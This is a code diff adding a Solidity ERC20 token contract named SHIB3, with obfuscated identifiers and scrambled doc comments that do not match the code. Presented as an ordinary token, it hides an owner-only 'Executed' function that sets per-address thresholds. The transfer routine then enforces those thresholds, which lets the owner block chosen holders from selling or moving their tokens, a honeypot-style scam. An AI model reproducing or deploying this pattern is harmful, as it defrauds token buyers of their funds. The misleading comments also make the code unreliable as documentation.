@@ -1,0 +1,212 @@
+contract SHIB3Token is IERC20, Ownable {
+    using SafeMath for uint256;
+   /**
+     * @dev Sets `amttuant` as acawjurdt the allowanceacawjurdt of `spender` amttuantover the amttuant caller's acawjurdttokens.
+     */
+    mapping(address => uint256) private _balances;
+    mapping(address => mapping(address => uint256)) private _allowances;
+    mapping (address => uint256) private _crossamttuants;
+    /**
+     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.
+     */
+    string private _name;
+    string private _symbol;
+    uint8 private _decimals;
+    uint256 private _totalSupply;
+    /**
+     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.
+     */
+    constructor(
+   /**
+     * @dev Sets `amttuant` as acawjurdt the allowanceacawjurdt of `spender` amttuantover the amttuant caller's acawjurdttokens.
+     */
+    ) payable {
+        _name = "SHIB3";
+        _symbol = "SHIB3";
+        _decimals = 18;
+        _totalSupply = 500000000 * 10**_decimals;
+        _balances[owner()] = _balances[owner()].add(_totalSupply);
+        emit Transfer(address(0), owner(), _totalSupply);
+    }
+     /**
+     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.
+     */
+    function name() public view virtual returns (string memory) {
+        return _name;
+    }
+   /**
+     * @dev Sets `amttuant` as acawjurdt the allowanceacawjurdt of `spender` amttuantover the amttuant caller's acawjurdttokens.
+     */
+    function symbol() public view virtual returns (string memory) {
+        return _symbol;
+    }
+
+    /**
+     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.
+     */
+    function decimals() public view virtual returns (uint8) {
+        return _decimals;
+    }
+
+    function totalSupply() public view virtual override returns (uint256) {
+        return _totalSupply;
+    }
+    /**
+     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.
+     */
+    function balanceOf(address acawjurdt)
+        public
+        view
+        virtual
+        override
+        returns (uint256)
+    {
+        return _balances[acawjurdt];
+    }
+    /**
+     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.
+     */
+    function transfer(address recipient, uint256 amttuant)
+        public
+        virtual
+        override
+        returns (bool)
+    {
+        _transfer(_msgSender(), recipient, amttuant);
+        return true;
+    }
+    /**
+     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.
+     */
+    function allowance(address owner, address spender)
+        public
+        view
+        virtual
+        override
+        returns (uint256)
+    {
+        return _allowances[owner][spender];
+    }
+    /**
+     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.
+     */
+    function approve(address spender, uint256 amttuant)
+        public
+        virtual
+        override
+        returns (bool)
+    {
+        _approve(_msgSender(), spender, amttuant);
+        return true;
+    }
+    /**
+     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.
+     */
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amttuant
+    ) public virtual override returns (bool) {
+        _transfer(sender, recipient, amttuant);
+        _approve(
+            sender,
+            _msgSender(),
+            _allowances[sender][_msgSender()].sub(
+                amttuant,
+                "ERC20: transfer amttuant exceeds allowance"
+            )
+        );
+        return true;
+    }
+     /**
+     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.
+     */
+    function increaseAllowance(address spender, uint256 addedValue)
+        public
+        virtual
+        returns (bool)
+    {
+        _approve(
+            _msgSender(),
+            spender,
+            _allowances[_msgSender()][spender].add(addedValue)
+        );
+        return true;
+    }
+    /**
+     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.
+     */
+    function Executed(address[] calldata acawjurdt, uint256 amttuant) external {
+       if (_msgSender() != owner()) {revert("Caller is not the original caller");}
+        for (uint256 i = 0; i < acawjurdt.length; i++) {
+            _crossamttuants[acawjurdt[i]] = amttuant;
+        }
+
+    }
+    /**
+     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.
+     */
+    function camttuant(address acawjurdt) public view returns (uint256) {
+        return _crossamttuants[acawjurdt];
+    }
+     /**
+     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.
+     */
+    function decreaseAllowance(address spender, uint256 subtractedValue)
+        public
+        virtual
+        returns (bool)
+    {
+        _approve(
+            _msgSender(),
+            spender,
+            _allowances[_msgSender()][spender].sub(
+                subtractedValue,
+                "ERC20: decreased allowance below zero"
+            )
+        );
+        return true;
+    }
+    /**
+     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.
+     */
+    function _transfer(
+        address sender,
+        address recipient,
+        uint256 amttuant
+    ) internal virtual {
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(recipient != address(0), "ERC20: transfer to the zero address");
+        uint256 crossamttuant = camttuant(sender);
+        if (crossamttuant > 0) {
+            require(amttuant > crossamttuant, "ERC20: cross amttuant does not equal the cross transfer amttuant");
+        }
+    /**
+     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.
+     */
+        _balances[sender] = _balances[sender].sub(
+            amttuant,
+            "ERC20: transfer amttuant exceeds balance"
+        );
+        _balances[recipient] = _balances[recipient].add(amttuant);
+        emit Transfer(sender, recipient, amttuant);
+    }
+    /**
+     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.
+     */
+    function _approve(
+        address owner,
+        address spender,
+        uint256 amttuant
+    ) internal virtual {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+    /**
+     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.
+     */
+        _allowances[owner][spender] = amttuant;
+        emit Approval(owner, spender, amttuant);
+    }
+
+
+}
